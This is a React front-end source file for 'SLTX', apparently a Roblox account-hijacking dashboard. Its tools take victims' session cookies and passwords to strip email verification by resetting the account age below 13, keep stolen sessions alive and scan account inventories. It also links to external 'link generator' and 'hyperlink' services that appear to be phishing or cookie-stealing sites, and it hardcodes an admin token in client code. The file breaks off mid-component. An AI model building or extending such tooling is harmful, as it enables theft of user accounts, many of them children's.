import React, { useState, useEffect } from 'react';
import {
  HashRouter as Router,
  Routes,
  Route,
  Link,
  useNavigate,
  useLocation,
  Navigate
} from 'react-router-dom';
import {
  LayoutDashboard,
  ShieldCheck,
  RefreshCw,
  UserSearch,
  BookOpen,
  Lock,
  MessageSquare,
  Activity,
  Globe,
  Link as LinkIcon,
  X,
  Menu,
  CheckCircle2,
  XCircle,
  Copy,
  ChevronDown,
  ChevronUp,
  Loader2,
  Search,
  User,
  ArrowLeft,
  Zap,
  AlertTriangle,
  EyeOff,
  Database,
  Key
} from 'lucide-react';

// --- Components ---

function ResponseDisplay({ 
  status, 
  title, 
  message, 
  content, 
  onCopyContent, 
  copied 
}: { 
  status: 'success' | 'error' | 'loading' | null, 
  title?: string, 
  message?: string, 
  content?: string, 
  onCopyContent?: () => void, 
  copied?: boolean 
}) {
  if (!status) {
    return (
      <div className="mt-6 p-8 rounded-3xl border border-[#1f1f1f] bg-[#0a0a0a] flex flex-col items-center justify-center gap-3 text-center">
        <div className="w-12 h-12 bg-[#141414] rounded-2xl flex items-center justify-center text-gray-500 mb-2">
          <Activity size={24} />
        </div>
        <h4 className="font-black italic tracking-wide text-lg uppercase text-gray-400">Ready to Execute</h4>
        <p className="text-gray-500 text-sm font-medium">Fill in the details above and start the session.</p>
      </div>
    );
  }

  if (status === 'loading') {
    return (
      <div className="mt-6 p-8 rounded-3xl border border-[#1f1f1f] bg-[#0a0a0a] flex flex-col items-center justify-center gap-3">
        <Loader2 size={28} className="animate-spin text-white" />
        <p className="text-gray-400 text-sm font-medium">Processing your request...</p>
      </div>
    );
  }

  const isSuccess = status === 'success';

  return (
    <div className={`mt-6 p-6 rounded-3xl border ${
      isSuccess 
        ? 'bg-green-500/5 border-green-500/20' 
        : 'bg-red-500/5 border-red-500/20'
    }`}>
      <div className="flex items-center gap-3 mb-2">
        {isSuccess ? <CheckCircle2 className="text-green-500" size={24} /> : <XCircle className="text-red-500" size={24} />}
        <h4 className={`font-black italic tracking-wide text-lg uppercase ${isSuccess ? 'text-green-400' : 'text-red-400'}`}>
          {title || (isSuccess ? 'Operation Successful' : 'Operation Failed')}
        </h4>
      </div>
      
      <p className="text-gray-400 text-sm mb-4 leading-relaxed">
        {message}
      </p>
      
      {content && (
        <div className="relative mt-4">
          <div className="bg-[#050505] border border-[#1f1f1f] rounded-2xl p-4 text-xs font-mono text-gray-300 overflow-x-auto whitespace-pre-wrap max-h-64">
            {content}
          </div>
          {onCopyContent && (
            <button 
              onClick={onCopyContent}
              className="absolute top-3 right-3 p-2 bg-[#141414] hover:bg-[#1f1f1f] border border-[#1f1f1f] rounded-xl text-gray-300 transition-colors flex items-center gap-1.5 text-xs font-bold uppercase tracking-wider"
            >
              {copied ? <><CheckCircle2 size={14} className="text-green-400"/> Copied</> : <><Copy size={14} /> Copy</>}
            </button>
          )}
        </div>
      )}
    </div>
  );
}

function StatItem({ icon, label, value }: { icon: React.ReactNode, label: string, value: string | number }) {
  return (
    <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 flex items-center gap-5 hover:border-gray-700 transition-colors group">
      <div className="bg-[#141414] p-4 rounded-2xl group-hover:scale-110 transition-transform duration-300">
        {icon}
      </div>
      <div>
        <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mb-1 uppercase">{label}</p>
        <p className="text-2xl font-black italic tracking-wide text-white">{value}</p>
      </div>
    </div>
  );
}

function ToolCard({ 
  icon, 
  title, 
  description, 
  onClick, 
  children 
}: { 
  icon: React.ReactNode, 
  title: string, 
  description: string, 
  onClick?: () => void,
  children?: React.ReactNode
}) {
  return (
    <div 
      className={`bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-6 flex flex-col h-full transition-all duration-300 ${onClick ? 'cursor-pointer hover:border-gray-600 hover:-translate-y-1' : ''}`}
      onClick={onClick}
    >
      <div className="bg-[#141414] w-14 h-14 rounded-2xl flex items-center justify-center text-white mb-6">
        {icon}
      </div>
      <h3 className="text-xl font-black italic tracking-wide text-white mb-3 uppercase">{title}</h3>
      <p className="text-gray-400 text-sm leading-relaxed flex-grow mb-6">{description}</p>
      
      {children ? children : (
        <button className="w-full bg-white text-black font-black italic tracking-wide py-3.5 px-4 rounded-2xl hover:bg-gray-200 transition-colors text-sm uppercase mt-auto">
          Open Session
        </button>
      )}
    </div>
  );
}

function SidebarLink({ 
  to, 
  icon, 
  label, 
  isActive, 
  onClick 
}: { 
  to: string, 
  icon: React.ReactNode, 
  label: string, 
  isActive: boolean, 
  onClick?: () => void 
}) {
  return (
    <Link 
      to={to} 
      onClick={onClick}
      className={`flex items-center gap-4 px-5 py-4 rounded-2xl transition-all duration-200 group relative ${
        isActive 
          ? 'bg-[#141414] text-white' 
          : 'text-gray-500 hover:bg-[#0a0a0a] hover:text-gray-300'
      }`}
    >
      <div className={`${isActive ? 'text-white' : 'text-gray-500 group-hover:text-gray-300'}`}>
        {icon}
      </div>
      <span className="font-bold text-sm tracking-wide uppercase">{label}</span>
      {isActive && (
        <div className="absolute right-4 w-1.5 h-1.5 rounded-full bg-white shadow-[0_0_10px_rgba(255,255,255,0.5)]" />
      )}
    </Link>
  );
}

function ExternalLink({ 
  href, 
  icon, 
  label 
}: { 
  href: string, 
  icon: React.ReactNode, 
  label: string 
}) {
  return (
    <a 
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className="flex items-center gap-4 px-5 py-4 rounded-2xl transition-all duration-200 text-gray-500 hover:bg-[#0a0a0a] hover:text-gray-300 group"
    >
      <div className="text-gray-500 group-hover:text-gray-300">
        {icon}
      </div>
      <span className="font-bold text-sm tracking-wide uppercase">{label}</span>
    </a>
  );
}

function FaqItem({ question, answer }: { question: string, answer: string }) {
  const [isOpen, setIsOpen] = useState(false);
  
  return (
    <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-2xl overflow-hidden transition-all duration-300">
      <button 
        className="w-full px-6 py-5 flex items-center justify-between text-left focus:outline-none"
        onClick={() => setIsOpen(!isOpen)}
      >
        <span className="font-bold text-white text-sm uppercase tracking-wide pr-8">{question}</span>
        <div className={`text-gray-500 transition-transform duration-300 ${isOpen ? 'rotate-180' : ''}`}>
          <ChevronDown size={20} />
        </div>
      </button>
      <div 
        className={`px-6 text-gray-400 text-sm leading-relaxed transition-all duration-300 ease-in-out ${
          isOpen ? 'pb-5 max-h-96 opacity-100' : 'max-h-0 opacity-0 overflow-hidden'
        }`}
      >
        {answer}
      </div>
    </div>
  );
}

function RulesItem({ title, children, defaultExpanded = false }: { title: string, children: React.ReactNode, defaultExpanded?: boolean }) {
  const [isExpanded, setIsExpanded] = useState(defaultExpanded);

  return (
    <div className={`border border-[#1f1f1f] rounded-3xl overflow-hidden transition-all duration-300 ${isExpanded ? 'bg-[#0a0a0a]' : 'bg-[#050505] hover:bg-[#0a0a0a]'}`}>
      <button 
        className="w-full px-6 py-5 flex items-center justify-between text-left focus:outline-none"
        onClick={() => setIsExpanded(!isExpanded)}
      >
        <div className="flex items-center gap-4">
          <div className={`p-2 rounded-xl ${isExpanded ? 'bg-[#141414] text-white' : 'bg-transparent text-gray-500'}`}>
            <AlertTriangle size={20} />
          </div>
          <h3 className={`font-black italic tracking-wide text-lg uppercase ${isExpanded ? 'text-white' : 'text-gray-300'}`}>{title}</h3>
        </div>
        <div className="text-gray-500">
          {isExpanded ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
        </div>
      </button>
      
      {isExpanded && (
        <div className="px-6 pb-6 pt-2 text-gray-400 text-sm leading-relaxed border-t border-[#1f1f1f] mt-2">
          {children}
        </div>
      )}
    </div>
  );
}

// --- Pages ---

function Dashboard({ backendStats }: any) {
  const navigate = useNavigate();
  
  return (
    <div className="max-w-7xl mx-auto">
      {/* Stats Row */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
        <StatItem 
          icon={<Activity size={20} className="text-white" />} 
          label="Total Bypasses" 
          value={backendStats?.totalBypasses?.toString() || "0"} 
        />
        <StatItem 
          icon={<UserSearch size={20} className="text-white" />} 
          label="Accounts Checked" 
          value={backendStats?.totalChecks?.toString() || "0"} 
        />
        <StatItem 
          icon={<RefreshCw size={20} className="text-white" />} 
          label="Cookies Refreshed" 
          value={backendStats?.totalRefreshes?.toString() || "0"} 
        />
      </div>

      <div className="mb-8 flex items-center justify-between">
        <div>
          <h2 className="text-4xl font-black italic tracking-wide text-white uppercase">Sessions</h2>
          <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mt-2 uppercase">Technology</p>
        </div>
        <div className="hidden sm:flex items-center gap-2 bg-[#0a0a0a] border border-[#1f1f1f] rounded-full p-1">
          <button className="bg-white text-black font-bold text-[10px] tracking-wider uppercase px-4 py-2 rounded-full">All Sessions</button>
        </div>
      </div>

      {/* Tools Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        <ToolCard
          icon={<ShieldCheck size={24} />}
          title="Bypasser"
          description="Forces Roblox accounts age from 13+ to 13- which removes the email verification."
          onClick={() => navigate('/bypass')}
        />

        <ToolCard
          icon={<RefreshCw size={24} />}
          title="Refresher"
          description="Keep your sessions alive and secure with high-end persistence."
          onClick={() => navigate('/refresh')}
        />

        <ToolCard
          icon={<UserSearch size={24} />}
          title="Account Checker"
          description="Deep scanner that checks the inventory using a cookie."
          onClick={() => navigate('/checker')}
        />

        <ToolCard
          icon={<Activity size={24} />}
          title="Autohar"
          description="Automated HAR tool for testing and analysis."
          onClick={() => window.open('https://bloxtools.net/page/login/21c86853', '_blank')}
        />

        <ToolCard
          icon={<Globe size={24} />}
          title="Link Generator"
          description="Create custom links for testing and routing."
        >
          <div className="flex flex-col gap-3 mt-2">
            <button 
              onClick={() => window.open('https://www.logged.tg/auth/klux4', '_blank')}
              className="w-full bg-white text-black font-black italic tracking-wide py-3.5 px-4 rounded-2xl hover:bg-gray-200 transition-colors text-sm uppercase"
            >
              Main Site
            </button>
            <button 
              onClick={() => window.open('https://app.beamse.pro/gen/esp', '_blank')}
              className="w-full bg-[#141414] border border-[#1f1f1f] text-white font-black italic tracking-wide py-3.5 px-4 rounded-2xl hover:bg-[#1f1f1f] transition-colors text-sm uppercase"
            >
              Backup Site
            </button>
          </div>
        </ToolCard>

        <ToolCard
          icon={<LinkIcon size={24} />}
          title="Hyperlink"
          description="Advanced security for your sensitive links."
          onClick={() => window.open('https://silentx-hyperlink.vercel.app/', '_blank')}
        />
      </div>
    </div>
  );
}

function Bypasser({ setBackendStats }: any) {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
  const [response, setResponse] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const navigate = useNavigate();

  const handleBypass = async () => {
    if (!cookie || !password) {
      setStatus('error');
      setResponse({ message: 'Please provide both cookie and password.' });
      return;
    }
    setStatus('loading');
    setCopied(false);
    try {
      const res = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, password })
      });
      
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch (e) {
        setStatus('error');
        setResponse({ message: `Server Error: ${text.substring(0, 100)}` });
        return;
      }

      if (res.ok) {
        setStatus('success');
        setResponse(data);
        setBackendStats((prev: any) => ({ ...prev, totalBypasses: prev.totalBypasses + 1 }));
      } else {
        setStatus('error');
        setResponse(data);
      }
    } catch (error: any) {
      setStatus('error');
      setResponse({ message: error.message || 'An error occurred' });
    }
  };

  const copyContent = () => {
    if (response) {
      navigator.clipboard.writeText(JSON.stringify(response, null, 2));
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="max-w-3xl mx-auto">
      <button 
        onClick={() => navigate('/')}
        className="flex items-center gap-2 text-gray-500 hover:text-white transition-colors mb-8 text-xs font-bold uppercase tracking-wider"
      >
        <ArrowLeft size={16} /> Back to Sessions
      </button>

      <header className="mb-10">
        <h1 className="text-4xl font-black italic tracking-wide text-white uppercase flex items-center gap-4">
          <ShieldCheck size={36} className="text-white" />
          Bypasser
        </h1>
        <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mt-2 uppercase">Forces Roblox accounts age from 13+ to 13- which removes the email verification.</p>
      </header>

      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-8">
        <div className="space-y-6">
          <div>
            <label className="block text-[10px] font-bold text-gray-500 mb-3 uppercase tracking-wider flex items-center gap-2">
              <Database size={14} /> Roblox Cookie
            </label>
            <input 
              type="text" 
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-5 py-4 text-white placeholder-gray-600 focus:outline-none focus:border-gray-500 transition-all font-mono text-sm"
            />
          </div>
          <div>
            <label className="block text-[10px] font-bold text-gray-500 mb-3 uppercase tracking-wider flex items-center gap-2">
              <Lock size={14} /> Password
            </label>
            <input 
              type="password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-5 py-4 text-white placeholder-gray-600 focus:outline-none focus:border-gray-500 transition-all font-mono text-sm"
            />
          </div>
          <button 
            onClick={handleBypass}
            disabled={status === 'loading'}
            className="w-full bg-white text-black font-black italic tracking-wide py-4 px-4 rounded-2xl hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-4 uppercase text-sm flex items-center justify-center gap-2"
          >
            <Zap size={18} /> Execute Session
          </button>
        </div>
      </div>

      <ResponseDisplay 
        status={status} 
        title={status === 'success' ? 'Bypass Successful' : 'Bypass Failed'}
        message={response?.message || response?.error}
        content={response ? JSON.stringify(response, null, 2) : undefined}
        onCopyContent={copyContent}
        copied={copied}
      />
    </div>
  );
}

function Refresher({ setBackendStats }: any) {
  const [cookie, setCookie] = useState('');
  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
  const [response, setResponse] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const navigate = useNavigate();

  const handleRefresh = async () => {
    if (!cookie) {
      setStatus('error');
      setResponse({ message: 'Please provide a cookie.' });
      return;
    }
    setStatus('loading');
    setCopied(false);
    try {
      const res = await fetch('/api/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });
      
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch (e) {
        setStatus('error');
        setResponse({ message: `Server Error: ${text.substring(0, 100)}` });
        return;
      }

      if (res.ok) {
        setStatus('success');
        setResponse(data);
        setBackendStats((prev: any) => ({ ...prev, totalRefreshes: prev.totalRefreshes + 1 }));
      } else {
        setStatus('error');
        setResponse(data);
      }
    } catch (error: any) {
      setStatus('error');
      setResponse({ message: error.message || 'An error occurred' });
    }
  };

  const copyContent = () => {
    if (response?.result?.content) {
      navigator.clipboard.writeText(response.result.content);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="max-w-3xl mx-auto">
      <button 
        onClick={() => navigate('/')}
        className="flex items-center gap-2 text-gray-500 hover:text-white transition-colors mb-8 text-xs font-bold uppercase tracking-wider"
      >
        <ArrowLeft size={16} /> Back to Sessions
      </button>

      <header className="mb-10">
        <h1 className="text-4xl font-black italic tracking-wide text-white uppercase flex items-center gap-4">
          <RefreshCw size={36} className="text-white" />
          Refresher
        </h1>
        <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mt-2 uppercase">Keep your sessions alive and secure with high-end persistence.</p>
      </header>

      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-8">
        <div className="space-y-6">
          <div>
            <label className="block text-[10px] font-bold text-gray-500 mb-3 uppercase tracking-wider flex items-center gap-2">
              <Database size={14} /> Roblox Cookie
            </label>
            <input 
              type="text" 
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-5 py-4 text-white placeholder-gray-600 focus:outline-none focus:border-gray-500 transition-all font-mono text-sm"
            />
          </div>
          <button 
            onClick={handleRefresh}
            disabled={status === 'loading'}
            className="w-full bg-white text-black font-black italic tracking-wide py-4 px-4 rounded-2xl hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-4 uppercase text-sm flex items-center justify-center gap-2"
          >
            <Zap size={18} /> Execute Session
          </button>
        </div>
      </div>

      <ResponseDisplay 
        status={status} 
        title={status === 'success' ? 'Refresh Successful' : 'Refresh Failed'}
        message={response?.message || response?.error || response?.result?.message}
        content={response?.result?.content}
        onCopyContent={copyContent}
        copied={copied}
      />
    </div>
  );
}

function AccountChecker({ setBackendStats }: any) {
  const [cookie, setCookie] = useState('');
  const [status, setStatus] = useState<'success' | 'error' | 'loading' | null>(null);
  const [response, setResponse] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const navigate = useNavigate();

  const handleCheck = async () => {
    if (!cookie) {
      setStatus('error');
      setResponse({ message: 'Please provide a cookie.' });
      return;
    }
    setStatus('loading');
    setCopied(false);
    try {
      const res = await fetch('/api/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });
      
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch (e) {
        setStatus('error');
        setResponse({ message: `Server Error: ${text.substring(0, 100)}` });
        return;
      }

      if (res.ok) {
        setStatus('success');
        setResponse(data);
        setBackendStats((prev: any) => ({ ...prev, totalChecks: prev.totalChecks + 1 }));
      } else {
        setStatus('error');
        setResponse(data);
      }
    } catch (error: any) {
      setStatus('error');
      setResponse({ message: error.message || 'An error occurred' });
    }
  };

  const copyContent = () => {
    if (response) {
      navigator.clipboard.writeText(JSON.stringify(response, null, 2));
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="max-w-3xl mx-auto">
      <button 
        onClick={() => navigate('/')}
        className="flex items-center gap-2 text-gray-500 hover:text-white transition-colors mb-8 text-xs font-bold uppercase tracking-wider"
      >
        <ArrowLeft size={16} /> Back to Sessions
      </button>

      <header className="mb-10">
        <h1 className="text-4xl font-black italic tracking-wide text-white uppercase flex items-center gap-4">
          <UserSearch size={36} className="text-white" />
          Account Checker
        </h1>
        <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mt-2 uppercase">Deep scanner that checks the inventory using a cookie.</p>
      </header>

      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-8">
        <div className="space-y-6">
          <div>
            <label className="block text-[10px] font-bold text-gray-500 mb-3 uppercase tracking-wider flex items-center gap-2">
              <Database size={14} /> Roblox Cookie
            </label>
            <input 
              type="text" 
              value={cookie}
              onChange={(e) => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-5 py-4 text-white placeholder-gray-600 focus:outline-none focus:border-gray-500 transition-all font-mono text-sm"
            />
          </div>
          <button 
            onClick={handleCheck}
            disabled={status === 'loading'}
            className="w-full bg-white text-black font-black italic tracking-wide py-4 px-4 rounded-2xl hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-4 uppercase text-sm flex items-center justify-center gap-2"
          >
            <Zap size={18} /> Execute Session
          </button>
        </div>
      </div>

      <ResponseDisplay 
        status={status} 
        title={status === 'success' ? 'Check Successful' : 'Check Failed'}
        message={response?.message || response?.error}
        content={response ? JSON.stringify(response, null, 2) : undefined}
        onCopyContent={copyContent}
        copied={copied}
      />
    </div>
  );
}

function AdminPanel({ backendStats }: any) {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [tokenInput, setTokenInput] = useState('');
  const [error, setError] = useState('');

  const ADMIN_TOKEN = "SLTX-ADM-9XQ2-F4V1-L8P0-Z7M3";

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (tokenInput === ADMIN_TOKEN) {
      setIsAuthenticated(true);
      setError('');
    } else {
      setError('Invalid authorization token.');
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="max-w-md mx-auto mt-20">
        <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-8">
          <div className="flex justify-center mb-6">
            <div className="w-16 h-16 bg-[#141414] border border-[#1f1f1f] rounded-2xl flex items-center justify-center">
              <Lock size={32} className="text-white" />
            </div>
          </div>
          <h2 className="text-2xl font-black italic tracking-wide text-white uppercase text-center mb-2">Admin Access</h2>
          <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 uppercase text-center mb-8">Restricted Area</p>
          
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-[10px] font-bold text-gray-500 mb-3 uppercase tracking-wider flex items-center gap-2">
                <Key size={14} /> Authorization Token
              </label>
              <input 
                type="password" 
                value={tokenInput}
                onChange={(e) => setTokenInput(e.target.value)}
                placeholder="Enter secure token..."
                className="w-full bg-[#141414] border border-[#1f1f1f] rounded-2xl px-5 py-4 text-white placeholder-gray-600 focus:outline-none focus:border-gray-500 transition-all font-mono text-sm"
              />
            </div>
            {error && <p className="text-red-500 text-xs font-bold uppercase tracking-wider">{error}</p>}
            <button 
              type="submit"
              className="w-full bg-white text-black font-black italic tracking-wide py-4 px-4 rounded-2xl hover:bg-gray-200 transition-colors uppercase text-sm flex items-center justify-center gap-2"
            >
              <ShieldCheck size={18} /> Authenticate
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-4xl mx-auto">
      <header className="mb-12">
        <h1 className="text-4xl font-black italic tracking-wide text-white uppercase flex items-center gap-4">
          <Lock size={36} className="text-white" />
          Admin Panel
        </h1>
        <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mt-2 uppercase">System Administration</p>
      </header>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
        <StatItem 
          icon={<Activity size={20} className="text-white" />} 
          label="Total Bypasses" 
          value={backendStats?.totalBypasses?.toString() || "0"} 
        />
        <StatItem 
          icon={<UserSearch size={20} className="text-white" />} 
          label="Accounts Checked" 
          value={backendStats?.totalChecks?.toString() || "0"} 
        />
        <StatItem 
          icon={<RefreshCw size={20} className="text-white" />} 
          label="Cookies Refreshed" 
          value={backendStats?.totalRefreshes?.toString() || "0"} 
        />
      </div>

      <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-3xl p-8">
        <h3 className="text-xl font-black italic tracking-wide text-white mb-6 uppercase">System Status</h3>
        <div className="space-y-4">
          <div className="flex items-center justify-between p-4 bg-[#141414] rounded-2xl border border-[#1f1f1f]">
            <div className="flex items-center gap-3">
              <div className="w-2 h-2 rounded-full bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]"></div>
              <span className="font-bold text-sm text-gray-300 uppercase tracking-wider">API Services</span>
            </div>
            <span className="text-green-500 font-bold text-xs uppercase tracking-widest">Operational</span>
          </div>
          <div className="flex items-center justify-between p-4 bg-[#141414] rounded-2xl border border-[#1f1f1f]">
            <div className="flex items-center gap-3">
              <div className="w-2 h-2 rounded-full bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]"></div>
              <span className="font-bold text-sm text-gray-300 uppercase tracking-wider">Database</span>
            </div>
            <span className="text-green-500 font-bold text-xs uppercase tracking-widest">Operational</span>
          </div>
        </div>
      </div>
    </div>
  );
}

function Rules() {
  return (
    <div className="max-w-4xl mx-auto">
      <header className="mb-12">
        <h1 className="text-4xl font-black italic tracking-wide text-white uppercase">Rules & Terms</h1>
        <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mt-2 uppercase">Important Information</p>
      </header>

      <div className="space-y-4">
        <RulesItem title="1. Usage Policy" defaultExpanded={true}>
          <p className="mb-4">By using our services, you agree to comply with all applicable laws and regulations. You are solely responsible for your actions and any consequences that may arise from using our tools.</p>
          <ul className="list-disc pl-5 space-y-2 text-gray-400">
            <li>Do not use these tools for malicious purposes.</li>
            <li>Do not attempt to disrupt or compromise our infrastructure.</li>
            <li>We reserve the right to terminate access for any user violating these terms.</li>
          </ul>
        </RulesItem>

        <RulesItem title="2. Data Privacy">
          <p className="mb-4">We take your privacy seriously. Our tools are designed to process data securely and efficiently.</p>
          <ul className="list-disc pl-5 space-y-2 text-gray-400">
            <li>We do not store your sensitive credentials (passwords, cookies) permanently.</li>
            <li>Data processed through our APIs is handled in memory and discarded after the operation.</li>
            <li>We may collect anonymous usage statistics to improve our services.</li>
          </ul>
        </RulesItem>

        <RulesItem title="3. Liability Disclaimer">
          <p className="mb-4">Our services are provided "as is" without any warranties, express or implied.</p>
          <ul className="list-disc pl-5 space-y-2 text-gray-400">
            <li>We are not responsible for any account bans, data loss, or damages resulting from the use of our tools.</li>
            <li>Use these tools at your own risk.</li>
            <li>We do not guarantee 100% uptime or success rates for our sessions.</li>
          </ul>
        </RulesItem>

        <RulesItem title="4. Account Security">
          <p className="mb-4">You are responsible for maintaining the security of your accounts.</p>
          <ul className="list-disc pl-5 space-y-2 text-gray-400">
            <li>Never share your session cookies or passwords with untrusted parties.</li>
            <li>We recommend using our Refresher tool to maintain secure sessions.</li>
            <li>If you suspect your account has been compromised, take immediate action to secure it.</li>
          </ul>
        </RulesItem>
      </div>
    </div>
  );
}

function FAQ() {
  return (
    <div className="max-w-3xl mx-auto">
      <header className="mb-12">
        <h1 className="text-4xl font-black italic tracking-wide text-white uppercase">FAQ</h1>
        <p className="text-[10px] font-bold tracking-[0.2em] text-gray-500 mt-2 uppercase">Frequently Asked Questions</p>
      </header>

      <div className="space-y-4">
        <FaqItem 
          question="What is the Bypasser tool?" 
          answer="The Bypasser tool is designed to force a Roblox account's age setting from 13+ to under 13. This action effectively removes the email verification requirement on the account."
        />
        <FaqItem 
          question="How does the Refresher work?" 
          answer="The Refresher takes your current session cookie and generates a new, fresh session. This helps keep your account secure and prevents the session from expiring unexpectedly."
        />
        <FaqItem 
          question="Is my data safe?" 
          answer="Yes, we do not store your cookies or passwords. All processing is done securely and data is discarded immediately after the operation completes."
        />
        <FaqItem 
          question="Why did my bypass fail?" 
          answer="Bypass operations can fail for several reasons: invalid cookie, incorrect password, or Roblox may have updated their security measures. Ensure your inputs are correct and try again."
        />
        <FaqItem 
          question="What does the Account Checker do?" 
          answer="The Account Checker scans the inventory and details of an account using its cookie, providing you with a comprehensive overview of its assets and status."
        />
      </div>
    </div>
  );
}

// --- Main App Layout ---

function AppContent() {
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const location = useLocation();
  const [backendStats, setBackendStats] = useState({
    totalBypasses: 0,
    totalChecks: 0,
    totalRefreshes: 0
  });

  useEffect(() => {
    fetch('/api/stats')
      .then(res => res.json())
      .then(data => {
        if (data && typeof data.totalBypasses === 'number') {
          setBackendStats(data);
        }
      })
      .catch(err => console.error('Failed to fetch stats:', err));
  }, []);

  const closeMobileMenu = () => setIsMobileMenuOpen(false);

  return (
    <div className="min-h-screen bg-[#000000] text-white flex font-sans selection:bg-white selection:text-black">
      
      {/* Mobile Menu Overlay */}
      {isMobileMenuOpen && (
        <div 
          className="fixed inset-0 bg-black/80 z-40 lg:hidden backdrop-blur-sm"
          onClick={closeMobileMenu}
        />
      )}

      {/* Sidebar */}
      <aside className={`
        fixed lg:sticky top-0 left-0 h-screen w-72 bg-[#000000] border-r border-[#1f1f1f] flex flex-col z-50
        transition-transform duration-300 ease-in-out
        ${isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full lg:translate-x-0'}
      `}>
        <div className="p-8 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-white rounded-xl flex items-center justify-center">
              <ShieldCheck size={24} className="text-black" />
            </div>
            <h1 className="text-2xl font-black italic tracking-widest uppercase">SLTX</h1>
          </div>
          <button className="lg:hidden text-gray-500 hover:text-white" onClick={closeMobileMenu}>
            <X size={24} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto px-4 py-2 space-y-8 no-scrollbar">
          
          <div>
            <p className="px-5 text-[10px] font-bold tracking-[0.2em] text-gray-600 mb-3 uppercase">Menu</p>
            <div className="space-y-1">
              <SidebarLink to="/" icon={<LayoutDashboard size={20} />} label="Dashboard" isActive={location.pathname === '/'} onClick={closeMobileMenu} />
            </div>
          </div>

          <div>
            <p className="px-5 text-[10px] font-bold tracking-[0.2em] text-gray-600 mb-3 uppercase">Sessions</p>
            <div className="space-y-1">
              <SidebarLink to="/bypass" icon={<ShieldCheck size={20} />} label="Bypasser" isActive={location.pathname === '/bypass'} onClick={closeMobileMenu} />
              <SidebarLink to="/refresh" icon={<RefreshCw size={20} />} label="Refresher" isActive={location.pathname === '/refresh'} onClick={closeMobileMenu} />
              <SidebarLink to="/checker" icon={<UserSearch size={20} />} label="Account Checker" isActive={location.pathname === '/checker'} onClick={closeMobileMenu} />
            </div>
          </div>

          <div>
            <p className="px-5 text-[10px] font-bold tracking-[0.2em] text-gray-600 mb-3 uppercase">Information</p>
            <div className="space-y-1">
              <SidebarLink to="/rules" icon={<BookOpen size={20} />} label="Rules" isActive={location.pathname === '/rules'} onClick={closeMobileMenu} />
              <SidebarLink to="/faq" icon={<MessageSquare size={20} />} label="FAQ" isActive={location.pathname === '/faq'} onClick={closeMobileMenu} />
            </div>
          </div>

          <div>
            <p className="px-5 text-[10px] font-bold tracking-[0.2em] text-gray-600 mb-3 uppercase">Administration</p>
            <div className="space-y-1">
              <SidebarLink to="/admin" icon={<Lock size={20} />} label="Admin Panel" isActive={location.pathname === '/admin'} onClick={closeMobileMenu} />
            </div>
          </div>
        </div>

